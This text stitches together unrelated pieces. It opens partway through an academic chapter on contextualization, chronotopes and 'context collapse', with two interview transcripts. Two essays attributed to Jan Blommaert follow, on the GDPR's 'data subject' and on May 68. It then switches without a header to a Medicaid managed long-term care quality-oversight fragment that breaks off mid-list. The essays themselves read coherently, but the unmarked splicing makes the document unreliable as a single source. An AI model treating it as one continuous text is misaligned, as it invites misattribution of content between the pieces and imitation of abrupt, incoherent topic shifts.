In every moment of interaction, contextualization draws upon specific and non-unified resources (cf. Cicourel 1967, 1974; Silverstein 1992). Both dimensions are crucial if we wish to avoid undue simplifications such as “the context for this utterance is X”. The contextual resources drawn upon in contextualizing concrete interactions are inevitably multiple and layered (cf. Blommaert 2005). But they are not infinite, and not without structure and pattern. If we draw upon Goffman’s frames, we see that social experience is organized into such structures and patterns, in which particular forms of interaction – with attributes to be discussed in a moment – are attached to specific social situations in forms comparable to what Bakhtin called “chronotopes”.
Bakhtin developed the notion of chronotope (literally “timespace”) as a way to describe the sociohistorical layering in novels, more precisely the ways in which invocations of particular sociohistorical frames structured “voices” in specific situations, infusing them with identity scripts, moral orientations, participation frameworks (Goodwin & Goodwin 1992), expected and unexpected normative modes of conduct and roles within the situation – in short, the full sociocultural value of otherwise random forms of action (see the discussion in Blommaert 2015a and Blommaert & De Fina 2016). Thus in a fairy tale, the Big Bad Wolf is exactly that: male, big and bad, a threat to the others, and someone to be defeated by the others. Chronotopes, seen from this rather orthodox Bakhtinian perspective, provide moralized behavioral scripts in specific social situations (we called them formats above), and the recognition of social situations as specific (e.g. as a formal meeting) will prompt such scripts: as soon as the chair announces the beginning of the meeting, we will all reorganize our conduct, assume a different set of body poses, discursive patterns and relations with the other participants (e.g. respecting the chair’s formal leadership and the differential allocation of speaking rights), and align with the congregational work performed by the others. As soon as the meeting is over, we can shift back into another register of conduct, and the opponent during the meeting can turn into an ally in the pub during the post-meeting drink. Chronotopes impose formats on those inhabiting them, and this means that from the potentially infinite aspects of context animating events, a specific subset will be invoked and deployed as the normative script for conduct within that chronotopic situation, as the specific bit of social order to be followed by all those involved. Violating or disrupting that order – Goffman called them frame breaking – comes with moral judgments: everyday notions such as inappropriateness, rudeness, insolence, being off-topic, or trolling come to mind (cf. Blommaert & De Fina 2016; see Tagg, Seargeant & Brown 2017 for social media examples).
Chronotopes are, we believe, a useful gloss to address the specific nature of context and contextualization, one that forces us to examine with utmost precision what is elsewhere simply called “the context” of actual interactions. The notion also offers us a view of context as active, something that structures action and makes it socially recognizable and, thence, socially valued. The demand for precision will almost inevitably lead to outcomes in which particular chronotopes are
composed of several different actions and types of actions, as when someone checks his/her email or takes orders for sandwiches during a formal meeting – where each of these will have to proceed along the specific formats for such actions. Goffman (1974: 561) clearly pointed to that (using the term “realm statuses” for what we call formats here), and see e.g. Goodwin (2013) for excellent discussions.
Connected to other chronotopes, as when the relations between participants in a formal meeting are affected by already existing interpersonal relationships specific to other areas of social life or when the history of a particular issue is invoked as a frame for discussing its present status, or even when quoted or indirect speech is introduced into interaction embedding one chronotope and its actual voices into another one (e.g. Voloshinov 1973; Goodwin 2003).
Both outcomes are particularly interesting, for they take us to the issue of the non-unified nature of context and bring issues of scale into view (cf. Blommaert 2015a). Scale can best be understood as reflections and expressions of how social beings experience dimensions of sociocultural reality as indexical vectors, as informing the general normative patterns that shape formats of action (cf. Das 2016; Carr & Lempert 2016). Scales, thus, are interpretive and normative-evaluative, suggesting distinctions between what is general and what is specific, what is important and what is not, what is widely known and what isn’t, what is valid and what is not, what can be widely communicated and what cannot, what can be widely recognized and understood and what cannot. There is nothing stable, absolute or a priori about scales – we can obliquely recall our discussion of the “micro-macro” distinction here – for what we see in actual discursive work are scalar effects. To give a simple example: when the history of a particular issue is invoked as a decisive argument in discussing its present status, then that history is presented as a way of upscaling the current issue to normative levels immune to contemporary petty or personal concerns (“We already discussed and decided this point in January, there is no point in returning to it now!”) Conversely, when someone raises a point which is not seen by others as belonging to the most general normative layer of what goes on, it can be downscaled (“This is a detail” or “This is just your personal opinion”). In their actual deployment, scalar effects are indexically ordered degrees of moralization in social actions.
The presence of such non-unified (plural and scaled) contexts in concrete situations brings us to a third notion: synchronization (cf. Blommaert 2005: 131-137, 2018b). The scalar effects we just mentioned occur in real-time and on-the-spot moments of interaction, in a sort of evolving “synchrony” which hides layers of non-synchronous resources and folds them together into momentary and situated instances of making sense. We call this process synchronization because the highly diverse resources that are deployed as context are focused, so to speak, onto one single point in social action. In other branches of scholarship this process would be called “decision making”, with strong undertones of individual rational calibration. From an action-centered perspective, synchronization is a collaborative social act in which the format, not the rational calculation of its actors, is predominant (cf. Goodwin 2013).
Within such formats, synchronization ensures the degree of coherence we expect to find in interactions as an essential component in making sense of situations.
Formatting and nonlinear outcomes
Coherence, however, must not be imagined as a straight line from premises to conclusion. Neither can formats be imagined as closed boxes with extraordinarily transparent orders of indexicality, generally known to all participant. As said earlier, order is evolving and contingent upon the congregational work performed by participants. Recognizing a situation, we explained, proceeds through perceived order properties of such situations that can be framed into formats, then guiding the actions of participants. But outcomes cannot be linearly predicted from the starting conditions, because multiple forms of action can emerge within the same format, and be coherent to the participants. In other words, different kinds of actions can be ratified as properly within the format; formats allow nonlinear actions, and when it comes to normativity in connection to formats, we see a relatively open and relaxed form of normativity there.
This violates several older assumptions about communication. In speech act theory, J.L. Austin famously distinguished clear “felicity” conditions for smooth and “correct” interaction, while deviations of them (even a violation of one of them) would make the interaction “unhappy”, or “infelicitous”. Equally famous are Grice’s (1975) “maxims” for conversation – conditions for maintaining a well-ordered mode of interaction with any other interlocutor. Both (and many others) grounded their theories into widely shared folk views of the strong normative order required for interaction. Another set of assumptions that is violated by the nonlinearity-within-the-format we mentioned is that underlying the kind of naïve survey methodology devastatingly criticized by Cicourel (1964) and others. In such survey enterprises, the stability of the format is used as an argument for the stability of its outcomes. Concretely, it is assumed that as long as we ask the same questions in the same format to large numbers of respondents, the answers will be commensurable because each respondent was addressed identically. Converted into the terms we are using here, stable formats will generate linear actions, since every action will be an identical response to an identical prompt. Cicourel’s penetrating critique targeted the impressive amount of ignorance about actual forms of communication buried inside this methodological assumption, leading to the incredible suggestion that hundreds of different people would all have identical understandings of a question (and its meanings for the analyst) and that the actual (and highly diverse) conditions of the question-and-answer events would not have any effects on the respondents.
The fallacies of such assumptions can be shown through the following example, involving the present authors. In late 2017 Jan Blommaert set up a small practical exercise in research interviewing for MA students including Laura Smits and Noura Yacoubi. The instructions were clear: pairs needed to be formed and the roles of interviewer versus interviewee needed to be assigned; the interview was to proceed in English and (unbeknownst to the interviewees), the interview had to contain some potentially frame-disturbing elements. One of these elements was the opening question: “who are you really?” The format, we can see, was entirely scripted and uniform for all the teams.
Laura and Noura were both interviewees and were interviewed by classmates with whom both had a history of friendly personal encounters and lengthy conversations – in Dutch. All of them – interviewers and interviewees – were also students in the same year of the same program track at Tilburg University. Thus we can suppose other elements of potential stability to be there: shared membership of a clearly defined community, a shared history of interaction making all participants familiar with each other’s speech habits and idiosyncrasies, and also enabling all to know quite well who the other “really” was. Laura and Noura, however, responded to this question in radically different ways. Let us look at the sequences following the question; in the transcript “I” stands for “interviewer” and “R” for “respondent”.
Laura’s answer
I: SO Laura*, who are you REALLY?
R: Who are I (am) really.. Eu::hm. What do you want to know of me. What is–what is really?
I: TELL me something about yourself
R: Okay. I’m Laura .. Laura Smits .. I a::m twenty-three years old .. eu::hm.. I study Global Communication here at Tilburg university I play volleyba::ll I have a little sister, I have a boyfriend, and I live in Tilburg eu::hm furthermore<1> I think<1> I am very happy at the mome::nt in the situation I live in .. eu::hm ja* enjoying life/ …
I: Okay.
Noura’s answer
I: Uhm .. who are you really?
R: Who I am?
I: Yes
R: Well.. what do you mean? What do you want to know?//
I: Yeahh who are you?//
R: That is a.. difficult question [Laughing]/
I: Why is it difficult?//
R: Because you are asking *a lot* at the same time. Do you want to know my characteristics, my name, my birth, my hobbies, do you want to know my study?
I: Tell me what *you think* who you really are//
R: *Dude* [Laughing] well I am a… Dutch, well Moroccan-Dutch girl, born here, I’m uuhh 22 years old. Uuhm who I am? <2> Well I am a student that is part of my identity, I *feel* as a student, I am.. living the life of a student. Uhmm.. I am studying global communication/
I: Ohh
R: What a coincidence [Laughing]
I: Me too [Laughing]
R: Can you ask.. can you ask the question more specific?//
I: Is this really who you really are?
R: Well it’s uhm.. it is quite a lot who I am I mean.. also history comes into pla::y, also family comes into pla::y uuh who I am yeah I am a human being//
I: Okay but/
R: Punt
We see that Laura and Noura are both initially looking for the right frame, as both ask for clarification of their interviewers’ actions (“what do you want to know”?). Both, consequently, receive a reiteration of the question (part of the instructions given by Jan to the interviewers). But what follows are two entirely different courses of action. Laura instantly aligns with the perceived frame and gives what we could call a “profile answer” – the kind of clearly organized factual and affective information offered on social media profiles and in short introductory “pitches” to unknown people. She “neutralizes”, so to speak, the interviewer whom she considered to be a close friend, and addresses her in her role as an interviewer performing an unusual kind of interaction, which in the same move is “normalized”: this is an interview, it’s strange, but we’ll do it the way it should be done. The synchronization towards the format is complete in Laura’s case. Noura, by contrast, does not exit the interpersonal and intertextual frame, but engages in several turns of metapragmatic negotiation with the interviewer (also someone with whom she maintained a very friendly personal relationship), expressing discomfort and resistance to align with the format in utterances such as “dude” and “punt” (meaning “period”, “that’s it”). And while she does offer a kind of “profile answer” at some point, the answer is followed by a repeated request for clarification of what goes on. The chronotope of interpersonal friendship sits uncomfortably with that of the training interview, and synchronization is a process that demands quite a bit of construction work here. Note, however, that later in the interview Noura offers long and detailed autobiographical-narrative answers; the synchronization demands more work but happens eventually.
If Austin’s felicity conditions would be rigorously applied here, Noura’s initial response would perhaps be called “unhappy”, a “misfire”. Laura’s response would, from a similar perspective, be “correct” and “happy”, as it articulates the linear uptake of the interviewer’s action. From the viewpoint of making sense of the particular situation, however, Noura’s actions and those of Laura are equivalent and fit the format in spite of their substantial differences. What we can take from this is that uniformity in format does not guarantee uniformity in actions – a confirmation of Cicourel’s critique of assumptions to the contrary – and that diverse lines of action can occur within the same format, even if some actions are not linear responses to what preceded. Formats are not one-size-fits-all and linear–normative units.
Context collapse versus expansion
At this point, our action-centered proposal is complete: we see contextualization as the recognition of a situation through perceived order properties of such situations, that can be framed into formats, then guiding the actions of participants. We submit that it is applicable to interaction online and offline, since it avoids many of the core assumptions (and vocabulary) that are challenged by features of online interaction.
In studies of online interaction, “there are great analytical gains to be made by looking very closely at how particular activities are organized” (Goodwin & Goodwin 1992: 96). The advantages of that tactic can be illustrated by looking at an issue widely debated in the world of social media research: “context collapse”, i.e.
“the flattening out of multiple distinct audiences in one’s social network, such that people from different contexts become part of a singular group of message recipients”. (Vitak 2012: 541)
The theoretical and empirical validity of the concept of context collapse has been criticized by several discourse analysts (Georgakopoulou 2017a, 2017b; Tagg, Seargeant & Brown 2017; Szabla & Blommaert 2018). Indeed, online technology “complicates our metaphors of space and place, including the belief that audiences are separate from each other” (Marwick & boyd 2010: 115) and has taken us from a world of relatively transparent audiences to that of far less transparent “networked publics” (boyd 2011). But such complications cannot be solved by drawing on the sociological imagination we sketched earlier: that of “normal” dyadic face-to-face communication with well-known similar people in a tight community – which is what happens in the literature on context collapse. Such an anachronistic imagination spawns an abstract conceptualization of context as something which is only transparent when we situate humans in transparent situations in transparent communities, where “audiences” are known and trusted and people have full control over what they do in social action. When we move into the online world of online audiences and inconspicuous overhearers, of lurkers, aliases and bots, and of algorithms regulating the traffic and distribution of messages, such theoretical and analytic instruments obviously cease to be useful and have to be replaced by more flexible and precise ones.
In a case study of a long and highly complex discussion on a large Facebook group for Polish people living in The Netherlands, we used the action-centered perspective described here (Szabla & Blommaert 2018). At first glance, the case would be eminently qualified for context collapse: we had an enormous community of effective and potential participants, large enough to speak of a “networked audience” consisting of people who did not know each other. The lengthy nature of the online discussion may have disturbed our “metaphors of space and place” and the particular rudimentary platform affordances of Facebook may have complicated our expectations of coherence and sequentiality in dialogue, as responses to a prompt may not appear in adjacency but be separated by several intervening responses from others – a practical problem of synchronization, in fact. Facebook formats interactions in a curious way, and people may lose their bearings in such formats.
Our first empirical observation obviously complicated things further: the general activity of a “discussion” was, in actual fact, a mosaic of different actions, some linear and connected to the initial action (a request from a Polish-origin journalist for assistance in the making of a documentary on the labor conditions of Polish workers in The Netherlands) and many nonlinear, embedded and parallel to the initial action. People would indeed respond to the journalist’s request (and be redirected to the private messaging section of Facebook) but would also attack the orthographic errors in het Polish writing, discuss linguistic correctness in relation to Polish identity; they would accuse and scold each other on specific statements they had made, venture conspiracy theories about journalists and Polish émigrés, offer general observations about the work ethos of Polish and Dutch workers, and so forth. Each of these different lines of actions was normatively recognizable as a different chronotopic unit of participants, topics, orders of indexicality and moral codes, and was formatted accordingly.
The second observation, however, was that people found their way around this terrifically complex web of actions. The non-sequentiality of scripted Facebook interaction, the meandering of topics and participants and the generally confusing character of what went on did not appear as an obstacle for participants to participate in the specific parts of the event in which they got involved. We saw participation frameworks shift along with topic shifts, in such a way that just handfuls of people would be involved in an action, and know quite well who their actual addressees were and how they should proceed, and how they could migrate to another participation framework or exit the discussion when lines actions were closed. In other words: we saw plenty of congregational work shaping formats and subformats and connecting or disconnecting parts of the discussion from other parts. Participants made sense of the specific actions in which they were involved – they performed adequate contextualization work throughout, even if that included self- and other-correction and rectification, necessitated by the awkward Facebook discussion affordances. They recognized the specific situations, framed and formatted them into indexically ordered discursive actions. No contexts appeared to collapse; instead we saw an amazing density and intensity of contextualization work – context expansion, if you wish.
Conclusion
The example of context collapse versus context expansion brings us back to our point of departure: the need to rethink our commonly used notions of context and contextualization so as to make them useful and accurate for addressing a world of communication in which ordinary dyadic face-to-face conversation is no longer the Archimedian point and foundation for theory. Contemporary discourse analysts must be aware that the sociological imagination balancing on this Archimedian point is anachronistic, and that we cannot accurately address the phenomenology of contemporary communication without sacrificing that imagination. Doing that does not mean that we are left empty-handed to the task of analysis. We can fall back on reasonably robust tools and approaches that do not carry that bias of anachronism or can be refashioned so as to be free of it. In this chapter, we have made some proposals in that direction. Let they be a prompt for others to think along.

The citizen in the European GDPR: We’re all data subjects now
Jan Blommaert
As of May 25, 2018, the new European General Data Protection Regulation (GDPR) will be enforced. This new regulation took a long time to prepare and implement, for its scope is vast and its effects will be huge. Reading the voluminous documentation about the GDPR, especially when done with a moderate dose of critical discourse analysis, yields some puzzling and potentially disconcerting insights.
What is the GDPR about?
On the EU website dedicated to the GDPR, the aims of the regulation are described as follows: the GDPR “was designed to harmonize data privacy laws across Europe, to protect and empower all EU citizens data privacy and to reshape the way organizations across the region approach data privacy.” Even if the term “data privacy” is used as the element of coherence, we can anticipate something very complex here. We get a regulation that (a) creates legal uniformity regarding data privacy throughout the EU (and beyond); (b) in some way defines and delineates (and so presumably “empowers”) the data privacy rights of EU citizens, and (c) regulates and streamlines the ways in which data privacy is currently handled by “organizations”. The latter can be almost anything, from a boy scouts troupe to a multinational corporation, from a badminton club to a newspaper, from a university to a government department and internet provider. Knowing how the EU proceeds in its legislative work, one can only imagine the density of lobbying work that has preceded the GDPR, for almost anyone is affected by it.
Surely, data privacy is one of the most pressing concerns these days. The Cambridge Analytica-Facebook data leaks scandal is still being rolled out to the public, cybercrime (including identity theft, hacking and copyright violations) has become a top security priority, and all of us have had the pleasure of receiving emails from extraordinarily friendly people inviting us to re-activate our bank accounts or social security numbers by sending all our personal details over. So it is clear that something needed to be done about such new forms of risk in an online-offline world. And yes, in the GDPR there are long and carefully worded sections “empowering” citizens when it comes to data privacy.
But much more attention is given to the transactional aspects of personal data: the conditions and rights to acquire, store and use such data in commercial, security, research and other contexts. The GDPR codifies the age of the Internet of Things, of Big Data and of the many ways in which Big Data generates social, economic, cultural and political effects, most of them entirely new and, consequently, poorly regulated. The citizen’s rights to privacy are defined in a regulated world in which such data are traded, exchanged, merged, and analyzed by a tremendous range of other actors. And that is where things become intriguing.
From citizen to data subject
The text is what we would now call “posthuman”: human beings are not central in them. This becomes clear from the standard use of the term “data subject” in the GDPR rather than, for instance, “citizen”. To understand the implications of that, we need to take one step back and consider the most fundamental definition in the GDPR, that of “personal data”. Personal data stands for “any information relating to an identified or identifiable natural person (‘data subject’); an identifiable natural person is one who can be identified, directly or indirectly, in particular by reference to an identifier such as a name, an identification number, location data, an online identifier or to one or more factors specific to the physical, physiological, genetic, mental, economic, cultural or social identity of that natural person”.
The “identifiable natural person” is equated with “data subject”. This is not self-evident, but the reason lies in the small phrase “directly or indirectly” when it comes to being identified. Such innocuous-looking frases always look crucial to the critical discourse analyst, for they are deliberately vague while tremendously inclusive. They create an almost infinite scope for what counts as “identification” and, by extension, “identity”.
For here is the thing: one can be “identified” not just by anything directly leading to the “natural person” but even more by aggregations of indirect data gathered by others and within others’ range of legitimate agency through almost every instrument currently in place. The GPS data of your mobile phone, the algorithms of your social media profiles and your Amazon.com shopping routines, the IP address of your computer, records of medical check-ups and footage from surveillance cameras or drones placing you somewhere: all of these are “identifiers” that generate personal data. But without the “natural person” as an active, intentional agent – it is not the “natural person” who creates and controls these traces of identity. We are in the world of “profiling” here and, indeed, I can be “implicit in the algorithm” and identified as a bundle of correlated features only indirectly suggesting particular actions – to which actions I can be held accountable nonetheless.
Are such data still “personal”? Can they be reasonably used as “identifiers” not just of people but of their individual character, behavior and actual (intentional) actions? In a 2015 interview, European Data Protection Supervisor Giovanni Buttarelli was clear: no. Butarelli saw a post-personal (or posthuman, as I called it) future ahead: “the concept of ‘personal data protection’ will disappear in the near future, as will the concept of ‘personal data’. We will all be easier to predict and identify even without data about our individual identities, it will be easier to reuse the information and group it together with other information and interpret it accordingly”. He went on: “The concept of ‘data-subject’ and therefore of the individual will in all likelihood disappear too, as we will be grouped together according to segments of information (…) The difference between ‘personal’ and ‘non-personal’ will then be blurred”. We are, in the most literal sense of the term, the profiles constructed of us by Big Data. And since, in the views of the European Data Protection Supervisor, we are facing the end of the individual, one should wonder what’s left of privacy?
Who owns “me”?
Most of the identifiers discussed in the GDPR are not created by the “natural persons” they index, I said. I must add: many of them are not even owned by these “natural persons.” We return to the core purpose of the GDPR here: it should enable and regulate the trading, exchange, storage and use of data about “natural persons” but by other commercial and noncommercial actors. Yes of course, the GDPR now stipulates that when personal data leading to an identifiable “natural person” are being used, these persons have to be informed and consent must be asked and obtained. The latter, however, is far from an absolute rule in the GDPR. There are several exceptions and there is a gigantic loophole under the label of “anonymized data” – the thing Butarelli alluded to when he spoke of people being grouped according to “segments of information” rather than anything properly “personal”. This, in actual fact, is what the term “data subjects” actually means: people grouped and identified as “type” or “category” X, Y, Z on the basis of Big Data aggregations, of specific combinations of data leading to specific profiles for people. Such constructions can sometimes lead to “individual identities”, as Butarelli said. But they need not.
The thing is that even if data are not properly “personal”, in the end they still are about, and from, “natural persons”, no matter what the degree of privacy protection is. After all, the entire thing revolves around identifiability, and even if the data gathered on me are used in “non-personal” ways, what is being done with such data can still have an impact on me. So there is a very wide space left for constructions of “me”, for which I can be held accountable in variable ways, but which have not been made by me, nor are they owned by me – profiles of me are creations and commodities made by others about me, and what the GDPR does well and in detail is to organize a firm legal footing for trading and exchanging such items in a Big Data market. Data subjects, in the sense just described, are the product in that market; if the specific data subject is me, I am a product, not an actor in the deal. Not much citizen empowerment can be observed in the process.
The clever play of words in EU texts such as the GDPR has, on many previous occasions, had the tactical advantage of silencing or delaying public debate. Public declarations on the GDPR will continue to foreground the phrase in which EU citizens are said to be empowered with respect to data privacy. A careful reading of this text, however, raises several large and pretty fundamental questions left unaddressed by the decision makers – and for that, too, precedents are plenty in the history of EU decision making.

Did anything happen in May 68?
Jan Blommaert
Half a century ago, a wave of revolt hit countries as far apart as Japan and Czechoslovakia, Germany and the US, Mexico and France. Certainly due to its high profile around the Parisian Quartier Latin, where students confronted the regime of the legendary General De Gaulle during riots in May and June of that year, the events were nicknamed “May 68”. And under that name, the events became the object of heated controversy. The 50th anniversary of May 68 will be no exception to that.
Nothing has happened
As we know, May 68 in France ended when De Gaulle rallied his supporters and won the elections of June 1968 by a landslide. And it was the great French conservative thinker Raymond Aron who proclaimed shortly after the end of the revolt that rien ne s’est passé – nothing really happened in May 68. The order of De Gaulle’s republic had been restored, after all, and the bourgeoisie as well as the police state that were the joint targets of the revolt were still firmly in power.
While this version of the events became mainstream, another one was addded to this. May 68, claimed the likes of Bernard-Henri Lévy, was a moral and culturalcrisis, a vague counterculture with unspecified values, nothing more. It was a revolt against the cultural patriarchism, the traditional (masculine) structures of authority and the puritan morality of a conservative society, and it was above all a movement of individual empowerment and liberation. Young kids just wanted to be free, free to listen to rock music, grow their hair and wear blue jeans, make love not war, and tell their fathers to mind their own business.
This, in the eyes of more radically conservative thinkers, had led to a moral anarchy, a radical relativism of identities, values and norms and an over-the-top rejection of what was stable, good and true. May 68 has since become a bête noire for the New Right, and for half a century now it has been consistently blamed for almost everything that went wrong in Western societies since the 1960s: immigration and multiculturalism, feminism, sexual promiscuity, the liberal use of drugs, the normalization of homosexuality, the attacks on what is seen as robust masculinity – in short, May 68 destroyed all that was normal in societies such as ours. But other than that, nothing had really happened. Nothing politically at least.
May 68 was a decade long
Well, I’m not so sure about that, because in such acccounts of what happened in May 68 only a fraction of the events is discussed. A decade of worldwide turmoil – the 1960s – is reduced to a couple of weeks in which students (and only students) threw bricks at the police and painted funny slogans on the walls of their university halls. Why they did that, and why in so many places and in this way, is conveniently deleted from the narrative. So let us look at some elements that surrounded May 68. We shall see that it was actually a decade long.
The students did not just paint funny slogans on walls; they openly, loudly and relentlessly criticized the system of power characterizing their societies: the power incorporated by De Gaulle in France, Johnson and Nixon in the US and the Communist Party in Prague. In all of these cases, the power regime was connected – openly, loudly and relentlessly – with the Cold War which had led to increasing militarization and more agressive policing, with millions of young men drafted into national military service on their respective sides of the Cold War divide, and with powerfully developed surveillance and repression resources aimed at (even moderate) public dissidence. In the West and elsewhere, the Vietnam war became the iconic object of protest; but it wasn’t the only issue.
Vietnam became iconic because it was part of the huge wave of decolonization that characterized the 1960s, and because it showed how decolonization had been swept up in the power play of the Cold War. The 1960s started with Fidel Castro proclaiming the end of US imperialism in Cuba, soon followed by the failed US-backed invasion attempt at the Bay of Pigs, and by the Cuban Missile Crisis that rendered the possibility of a nuclear apocalyps part palpable everywhere. The colonial empires were rapidly replaced by independent states, the leaders of which often proved reluctant to enter into neocolonial relations with their former rulers. Mao Zedong theorized the “Third World” as a catchword to define the refusal of newly independent states to choose sides in the Cold War; the US intervention in Vietnam, as well as several other interventions against the rulers of the newly independent states, proved that the the Cold War protagonists didn’t like such forms of non-alignment. This kind of intervention was called imperialism by the May 68 activists, and they rejected it. In their eyes, alternative (read: socialist) roads to development and sovereignty should be, at least, allowed.
They also rejected it because the Cold War overseas imperialism was mirrored by what they identified as the return of “fascism” at home. The Cold War imposed anticommunism as a state doctrine in all NATO member states, and this had concrete consequences. It meant, for instance, that after the post-War “denazification” purges, military and security staff recruitment in countries such as Germany and France now displayed a preference for people with strong right-wing sympathies (including actual ex-nazis and collaborators) over people favoring socialism or communism. Maurice Papon, the powerful police prefect of Paris in the first half of the 1960s, was such a former collaborator, but it took until 1981 before he was convicted for direct involvement in the death of Jewish subjects under the Vichy regime.
With chiefs such as Papon, the police assumed the shape of a military and intelligence outfit outspokenly aimed at crushing any form of action that could be seen as pro-Soviet, however far-fetched. In other countries, similar processes occurred, and the targets of heavy-handed police interventions often included trade unions and striking workers, suspected of (directly or indirectly) assisting the socialist cause and destabilizing society. In the UK, an Emergency Powers Act was introduced in 1964; in Germany, similar laws were voted in 1968 to quell the widespread political and labor protests. The general current was to increase the power of the forces of order while reducing the civil rights of citizens (certainly when they were organized), and to increase the use of police violence in cases of unrest. The 1960s ended with TV-footage of Chicago police forces brutally beating young demonstrators at the Democratic National Convention in 1968 and with National Guardsmen shooting at students on the campus of Kent State University, Ohio, killing four.
TV-footage in that decade also included the assassination of John F. Kennedy, Patrice Lumumba, Robert Kennedy and Martin Luther King, the shooting of student leader Rüdi Dutschke in Germany and of two miners during a strike in Belgium, the self-immolation of Czech student Jan Palach and several Vietnamese Buddhist monks, and endless reports on bombings by American B52s in North Vietnam. The entire decade was one of unrest, large-scale dissidence and extreme violence. May 1968 was one moment in which much of this crystallized into a remarkable form of protest and rebellion, characterized by alliances between students and workers, men and women, urban and rural activists, black and white ones, intellectuals, artists, journalists, workers and lay people.
Everyone saw May 68
The 1960s ended also with another piece of historic TV-footage, seen across the world: the landing on the moon. And here is one dimension we should not overlook: the 1960s were the decade of television, of a new global mass media culture. And this, too, had an impact. TV-sets became a normal item in the homes of middle class and working class people alike all over the West, and with literacy levels rising, newspapers and magazines thrived. Jointly, the expansion of the new mass media created a globalized scale of image and content distribution which conclusively transformed the culture of the 20th century. Nothing remained outside the scope of the media now, even if it came from the exotic peripheries or from otherwise obscure corners of the world.
In the 1960s, not just the Beatles became global icons. Mao, Castro, Che, Nehru, Nasser, the Shah and the Negus, Nkrumah, Boumedienne and Kenyatta also rose to stardom. So did the North Vietnamese warriors Ho Chi Minh, Pham Van Dong and General Giap, and so did the Czech anti-Soviet activists Jan Palach and Alexander Dubchek; so too did Malcolm X and the Black Panthers. Among the most iconic images of the decade is that of the black US athletes Tommie Smith and John Carlos raising their black-gloved fists in antiracist protest during the medals ceremony at the Mexico 68 Olympic Games. In the small Belgian village where I spent my childhood, my primary school teacher pinned the photo, cut from the local newspaper, on the wall of our classroom; it was there for months.
Vietnam and the Cold War imperialism it bespoke became a worldwide focus of protest and mass mobilization not just because the Cold War affected (and infected) large parts of the world. It became iconic because these parts of the world were now effectively connected by streams of media information and imageries. Vietnam was the first truly global mediatized war, which is why it became the object of effectively globalized protest and resistance and why such protest assumed similar shapes in very different places. Vietnam was the moment when the Cold War became a globalized object of reflection, analysis and popular imagination, affecting global as well as local issues. “Vietnam is in our factories” was a popular slogan among the French workers during the enormous strike that accompanied the student protests in May 68.
May 68, consequently, was a global mediatized event as well – perhaps the very first globally shown instance of popular mass protest in the West, and like Vietnam, a moment in which previously separate dots were connected. The protests were not parochial; people openly, loudly and relentlessly proclaimed international solidarity with oppressed people everywhere, in the factories as well as in the ex-colonies and in the jungles of Vietnam, with women, immigrants and the victims of institutional racism in South Africa and the US. Intellectually, the events accelerated the recognition of voices “from below” or “from the margins” (advocated by Sartre, but also by historians such as E.P Thompson, Eric Hobsbawm and Carlo Ginzburg and sociologists such as Howard Becker). It also provoked a new critical study of power – with Foucault as its main architect – and it kickstarted the study of globalization processes (think of Immanuel Wallerstein) and worldwide structural inequalities (André Gunder Frank, for instance). It also laid the foundations for the international peace movement, the movement against nuclear weapons and movements for sustainable development and environmental awareness. In many ways, the world as we presently know it was shaped in the late 1960s. The effect of May 68 was massive, and it was above anything else, political.
Everything happened in May 68
The world as we presently know it is of course largely neoliberal and conservative. And this, too, can be partly attributed to May 68. I already mentioned the conservative backlash against the events of 1968 – the reduction of the events to a moral and cultural crisis, a loss of traditional values, a counterculture and so forth. But there is a more complex part to that story, which I can only briefly sketch here.
The focus on Vietnam in May 68, and the intellectual work that surrounded and followed it, marked the end of classical imperialism as a viable doctrine. It was effectively destroyed by the challenge of tiers-mondist (“Third-World-ist”) worldwide solidarity, framed initially by Mao Zedong’s theory of Third World non-alignment. But this challenge, in turn, caused old-style imperialism to be transformed into an amalgamation of neoliberalism and ethnocentrism. Both took another decade to enter into full force, and the end of the Cold War turned them into the cornerstones of a new world order.
Through neoliberalism, the neocolonial ties between the First and the Third Worlds could be rationalized, depoliticized and made “objective” in the form of purely economic, financial and monetary transactional relationships. At the same time, domestic social unrest could be equally turned anodyne, by reducing the political reading of class antagonisms to a depoliticized reading of balance sheets, efficiency and human resources management. The politics of inequality was converted into the economics of equal opportunities and free enterprise.
The political dimension of imperialism morphed into a heavily moralized ethnocentrism, in which “objective” racial, class and civilizational superiority was replaced by individualized, case-based judgments of moral compatibility. People in, say, Congo or Sierra Leone should no longer be seen as victims of extremely disadvantageous rates of exchange in the world markets and of exploitation by multinational corporations extracting surplus value without fair return. They were victims of corrupt leaders and warlords, and the latter – the Third World leaders – should “take responsibility” for their people’s well being. Worldwide solidarity was replaced by “we cannot solve all their problems”. And as for immigrants from such countries, they could always be accused of refusing to contribute to their country’s progress, and of not fitting in the codes of norms and values of their host societies. As Balibar and Wallerstein outlined in the early 1990s, class struggle and race theory had been replaced by softer, but equally effective discourses of cultural and moral compatibility. Similar discourses of moral and cultural compatibility can be (and are) deployed with respect to “domestic” issues of deviance and marginalization. “Hard” political analysis has been replaced by a rhetoric of blame, responsibility and character.
Raymond Aron was quite wrong in his appraisal of May 68. Those who now try to reduce its scope and impact to rock and roll, LSD, and flowers in one’s hair are quite wrong as well, as are those who rant against the “May 68 generation” as the architects of a society of hedonistic individualists devoid of any respect for values, traditions and norms. May 68 was above all else a political event in which a lot was reimagined and redefined. The worldwide protests laid bare some of the major fissures and contradictions of the post-war world; they shaped modes of globalized social, political and intellectual action that marked the end of that part of the 20th century and the beginning of the part that spilled over into the 21st century. May 68 was big, very big.

Within Medicaid, there are several entities that play a quality oversight role including monitoring of MCO contracts and program oversight, with 5 quality oversight staff dedicated to the project. The Department of Health licenses providers and conducts quality monitoring utilizing 4 staff.
State IT Infrastructure for Supporting Quality Oversight
The state relies on its MMIS for generating information on encounter data, claims data, diagnosis of members, MLTSS enrollment, eligibility information and screening data.
MCO Quality Oversight Responsibilities
The state requires MCOs to maintain and report annually on 2 quality oversight activities, adhering to NCQA's sampling standards, which are as follows:
Care Plan Audit--This protocol covers all the aspects of care plan development to ensure all policies and procedures are adequately followed.
Care System Audit--This protocol is broader and encompasses all aspects of the service delivery system.
The audit reports generated from these protocols also include corrective actions taken by the MCO when issues of non-compliance are discovered. The annual reports are submitted to the state for review. These reports are then used as part of the state's evidence-based report for fulfilling the 1915(c) HCBS quality requirements.
The State's Department of Health conducts "look-back" reviews of the audits 18 months after the MCO audits are completed to monitor remediation activities on any issues/deficiencies identified during the review.
State Audits of MLTSS Program
The state conducts a TCA, which is a validation of contract compliance done for each MCO. It involves a review of 16 elements that are used to evaluate the care given to members. This information is collected during its QA Examination, which is done every 3 years.
During the on-site exam the state collects, validates and reports MCO compliance information. The state then develops a summary of the information gathered for the 16 elements of the TCA, including:
Coverage of services;
Accessibility of providers;
QI program structure;
